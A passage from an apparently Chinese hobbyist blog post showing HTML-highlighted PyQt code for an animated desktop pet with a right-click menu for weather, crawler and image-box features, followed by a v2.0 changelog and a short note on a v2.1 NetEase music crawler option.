class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30a&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30b&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;30c&#x27;</span>,<span class="string">&#x27;31&#x27;</span>,<span class="string">&#x27;32&#x27;</span>,<span class="string">&#x27;33&#x27;</span>], <span class="comment"># 打喷嚏_11</span></span><br><span class="line">        [<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 撞墙_12</span></span><br><span class="line">    ]</span><br><span class="line">    PET_ACTIONS_MAP = &#123;<span class="string">&#x27;pet_1&#x27;</span>: ACTION_DISTRIBUTION&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>): PET_ACTIONS_MAP.update(&#123;<span class="string">&#x27;pet_%s&#x27;</span> % i+<span class="number">1</span>: ACTION_DISTRIBUTION&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;桌面宠物&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DesktopPet</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    tool_name = <span class="string">&#x27;桌面宠物&#x27;</span></span><br><span class="line">    stat = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, parent=<span class="literal">None</span>, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DesktopPet, self).__init__(parent)</span><br><span class="line">        self.cfg = Config()</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(self.cfg, key): <span class="built_in">setattr</span>(self.cfg, key, value)</span><br><span class="line">        self.setWindowFlags(Qt.FramelessWindowHint|Qt.WindowStaysOnTopHint|Qt.SubWindow)</span><br><span class="line">        self.setAutoFillBackground(<span class="literal">False</span>)</span><br><span class="line">        self.setAttribute(Qt.WA_TranslucentBackground, <span class="literal">True</span>)</span><br><span class="line">        self.repaint()</span><br><span class="line">        self.pet_images, iconpath = self.randomLoadPetImages()</span><br><span class="line">        quit_action = QAction(<span class="string">&#x27;退出&#x27;</span>, self, triggered=self.quitPet)</span><br><span class="line">        quit_action.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon_menu = QMenu(self)</span><br><span class="line">        self.tray_icon_menu.addAction(quit_action)</span><br><span class="line">        self.tray_icon = QSystemTrayIcon(self)</span><br><span class="line">        self.tray_icon.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon.setContextMenu(self.tray_icon_menu)</span><br><span class="line">        self.tray_icon.show()</span><br><span class="line">        self.image = QLabel(self)</span><br><span class="line">        self.setImage(self.pet_images[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.mouse_drag_pos = self.pos()</span><br><span class="line">        self.resize(<span class="number">236</span>, <span class="number">260</span>)</span><br><span class="line">        self.randomPosition()</span><br><span class="line">        self.is_running_action = <span class="literal">False</span></span><br><span class="line">        self.action_images = []</span><br><span class="line">        self.action_pointer = <span class="number">0</span></span><br><span class="line">        self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.x = self.pos().x()</span><br><span class="line">        self.y = self.pos().y()</span><br><span class="line">        self.heading = <span class="number">0</span></span><br><span class="line">        self.touchdown_key = <span class="number">0</span></span><br><span class="line">        self.jumpping_key = <span class="number">0</span></span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;初始化计时器&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">InitTimer</span>(<span class="params">self,Act,start</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.timeout.connect(Act)</span><br><span class="line">        self.timer.start(start)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机做一个动作&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomAct</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.key = random.randint(<span class="number">0</span>,<span class="built_in">len</span>(DesktopPet.stat)-<span class="number">1</span>)</span><br><span class="line">            self.action = DesktopPet.stat[self.key]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span>+<span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> self.heading == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Right&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.heading == <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Left&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.action == <span class="number">8</span>:</span><br><span class="line">                self.jumpping_key = <span class="number">1</span></span><br><span class="line">                self.InitTimer(self.randomAct,<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.touchdown_key == <span class="number">1</span>:</span><br><span class="line">            self.action_images = self.pet_images[<span class="number">6</span>]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.touchdown()</span><br><span class="line">        <span class="keyword">elif</span> self.jumpping_key == <span class="number">1</span>:</span><br><span class="line">            self.action_images = self.pet_images[<span class="number">8</span>]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.jumpping()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                self.moving()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;完成动作的每一帧&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runFrame</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            <span class="keyword">if</span> self.action != <span class="number">3</span>:</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moving</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            time.sleep(<span class="number">0.8</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            self.x = self.pos().x()</span><br><span class="line">            self.x += <span class="built_in">int</span>(<span class="number">32</span> * (<span class="number">0.5</span> - self.heading))</span><br><span class="line">            <span class="keyword">if</span> (self.heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.heading = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (self.heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.heading = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">1</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-撞墙&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hitwall</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.move(self.x, self.pos().y())</span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-坠落&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fall</span>(<span class="params">self</span>):</span></span><br><span class="line">        y = self.pos().y()</span><br><span class="line">        x = self.pos().x()</span><br><span class="line">        y += <span class="built_in">int</span>(<span class="number">16</span>)</span><br><span class="line">        screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">        <span class="keyword">if</span> (y &gt;= screenRect.height() - self.size().height()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;now is kiss the ground&#x27;</span>)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.touchdown_key = <span class="number">1</span></span><br><span class="line">            self.InitTimer(self.randomAct,<span class="number">80</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.move(x,y)</span><br><span class="line">            self.setImage(self.pet_images[<span class="number">6</span>][<span class="number">0</span>].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-触地&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">touchdown</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.x = self.pos().x()</span><br><span class="line">        self.y = self.pos().y()</span><br><span class="line">        self.x -= <span class="number">2</span></span><br><span class="line">        self.y -= <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">            self.touchdown_key = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.move(self.x, self.y)</span><br><span class="line">            self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">            self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-吃瘪&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">uncomfortable</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.action = <span class="number">0</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span> + <span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-拖动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dragging</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.action = <span class="number">3</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span> + <span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-跳跃&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">jumpping</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == <span class="number">0</span>:</span><br><span class="line">            self.z = <span class="number">80</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.fallingBody()</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">            self.jumpping_key = <span class="number">0</span></span><br><span class="line">            self.z = <span class="number">80</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            self.x = self.pos().x()</span><br><span class="line">            self.y = self.pos().y()</span><br><span class="line">            self.x += <span class="built_in">int</span>(<span class="number">48</span> * (<span class="number">0.5</span> - self.heading))</span><br><span class="line">            self.y -= self.z</span><br><span class="line">            self.z -= <span class="number">5</span></span><br><span class="line">            <span class="keyword">if</span> (self.heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    self.x = self.pos().x()</span><br><span class="line">                    self.x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.fallingBody()</span><br><span class="line">                    self.heading = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.y)</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (self.heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((self.x &lt;= <span class="number">0</span> <span class="keyword">and</span> self.heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        self.x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> self.heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    x = self.pos().x()</span><br><span class="line">                    x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall()</span><br><span class="line">                    self.fallingBody()</span><br><span class="line">                    self.heading = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(self.x, self.y)</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;设置当前显示的图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setImage</span>(<span class="params">self, image</span>):</span></span><br><span class="line">        self.image.setPixmap(QPixmap.fromImage(image))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机导入一个桌面宠物的所有图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomLoadPetImages</span>(<span class="params">self</span>):</span></span><br><span class="line">        cfg = self.cfg</span><br><span class="line">        pet_name = random.choice(<span class="built_in">list</span>(cfg.PET_ACTIONS_MAP.keys()))</span><br><span class="line">        actions = cfg.PET_ACTIONS_MAP[pet_name]</span><br><span class="line">        pet_images = []</span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> action <span class="keyword">in</span> actions:</span><br><span class="line">            patch = [self.loadImage(os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shime&#x27;</span>+item+<span class="string">&#x27;.png&#x27;</span>)) <span class="keyword">for</span> item <span class="keyword">in</span> action]</span><br><span class="line">            pet_images.append(patch)</span><br><span class="line">        iconpath = os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shimeX.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pet_images, iconpath</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标左右键功能&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mousePressEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.button() == Qt.LeftButton:</span><br><span class="line">            self.InitTimer(self.dragging,<span class="number">80</span>)</span><br><span class="line">            self.is_follow_mouse = <span class="literal">True</span></span><br><span class="line">            self.mouse_drag_pos = event.globalPos() - self.pos()</span><br><span class="line">            event.accept()</span><br><span class="line">            self.setCursor(QCursor(Qt.OpenHandCursor))</span><br><span class="line">        <span class="keyword">elif</span> event.button() == Qt.RightButton:</span><br><span class="line">            self.InitTimer(self.uncomfortable,<span class="number">80</span>)</span><br><span class="line">            self.menu = QMenu(self)</span><br><span class="line">            self.weather = self.menu.addAction(<span class="string">&quot;天气预报&quot;</span>)</span><br><span class="line">            self.crawler = self.menu.addAction(<span class="string">&quot;启动爬虫&quot;</span>)</span><br><span class="line">            self.imagebox = self.menu.addAction(<span class="string">&quot;图片盒子&quot;</span>)</span><br><span class="line">            self.quitA = self.menu.addAction(<span class="string">&quot;退出附属程序&quot;</span>)</span><br><span class="line">            self.quit = self.menu.addAction(<span class="string">&quot;退出桌宠&quot;</span>)</span><br><span class="line">            self.choice = self.menu.exec_(self.mapToGlobal(event.pos()))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.weather):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;weather&quot;</span>)</span><br><span class="line">                self.weatherGet()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.crawler):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;crawler&quot;</span>)</span><br><span class="line">                self.crawlerStart()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.imagebox):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;imagebox&quot;</span>)</span><br><span class="line">                self.imageBox()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.quitA):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;quitA&quot;</span>)</span><br><span class="line">                self.quitAttached()</span><br><span class="line">            <span class="keyword">if</span> (self.choice == self.quit):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">                self.quitPet()</span><br><span class="line"></span><br><span class="line">            self.randomAct()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标移动, 则宠物也移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseMoveEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> Qt.LeftButton <span class="keyword">and</span> self.is_follow_mouse:</span><br><span class="line">            self.move(event.globalPos() - self.mouse_drag_pos)</span><br><span class="line">            event.accept()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标释放时, 取消绑定&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseReleaseEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.setCursor(QCursor(Qt.ArrowCursor))</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;宠物自由落体&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fallingBody</span>(<span class="params">self</span>):</span></span><br><span class="line">        x = self.pos().x()</span><br><span class="line">        y = self.pos().y()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x=%x : y=%x&quot;</span> %(x,y))</span><br><span class="line">        self.InitTimer(self.fall,<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;导入图像&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loadImage</span>(<span class="params">self, imagepath</span>):</span></span><br><span class="line">        image = QImage()</span><br><span class="line">        image.load(imagepath)</span><br><span class="line">        <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机到一个屏幕上的某个位置&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomPosition</span>(<span class="params">self</span>):</span></span><br><span class="line">        screen_geo = QDesktopWidget().screenGeometry()</span><br><span class="line">        pet_geo = self.geometry()</span><br><span class="line">        width = (screen_geo.width() - pet_geo.width()) * random.random()</span><br><span class="line">        height = (screen_geo.height() - pet_geo.height()) * random.random()</span><br><span class="line">        self.move(<span class="built_in">int</span>(width), <span class="built_in">int</span>(height))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;天气预报&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">weatherGet</span>(<span class="params">self</span>):</span></span><br><span class="line">        wea.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;启动爬虫&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">crawlerStart</span>(<span class="params">self</span>):</span></span><br><span class="line">        pets.close()</span><br><span class="line">        cra.Start()</span><br><span class="line">        pets.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;图片盒子&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">imageBox</span>(<span class="params">self</span>):</span></span><br><span class="line">        box.show()</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出附属程序&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitAttached</span>(<span class="params">self</span>):</span></span><br><span class="line">        wea.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Everything is done!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出桌宠&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quitPet</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.close()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    pets = DesktopPet()</span><br><span class="line">    wea = Mainweather()</span><br><span class="line">    palette = QPalette()</span><br><span class="line">    palette.setBrush(QPalette.Background, QBrush(QPixmap(<span class="string">&quot;D:\PythonProject\images\YHellow.png&quot;</span>)))</span><br><span class="line">    wea.setPalette(palette)</span><br><span class="line">    cra = Crawler()</span><br><span class="line">    box = MainBOX()</span><br><span class="line">    pets.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li>version：v2.0</li>
<li>date：2022.5.14</li>
<li>type：<ul>
<li>Features：<ul>
<li>新添右键功能：天气预报</li>
<li>新添右键功能：爬虫</li>
<li>新添右键功能：图片盒子</li>
<li>新添右键功能：关闭所有附属程序</li>
</ul>
</li>
<li>Changed：NULL</li>
<li>Removed：NULL</li>
</ul>
</li>
<li>desc：<ul>
<li>想做的差不多都做了，下次试试连接网易云的 API</li>
</ul>
</li>
</ul>
<h2 id="DesktopPets-v2-1"><a href="#DesktopPets-v2-1" class="headerlink" title="DesktopPets_v2.1"></a>DesktopPets_v2.1</h2><p>新加入“网易云API”选项，其本质是一个爬虫，可以在 UI 界面选择歌曲</p>
<img src="/2022/05/14/%E6%A1%8C%E5%AE%A0%E5%BC%80%E5%8F%91%E2%85%A1/1652972355798.png" class width="1652972355798"> 
<p>PS：由于本人不会并发，所以在“网易云爬虫”爬歌的时候，桌宠和 UI 界面都会卡顿</p>
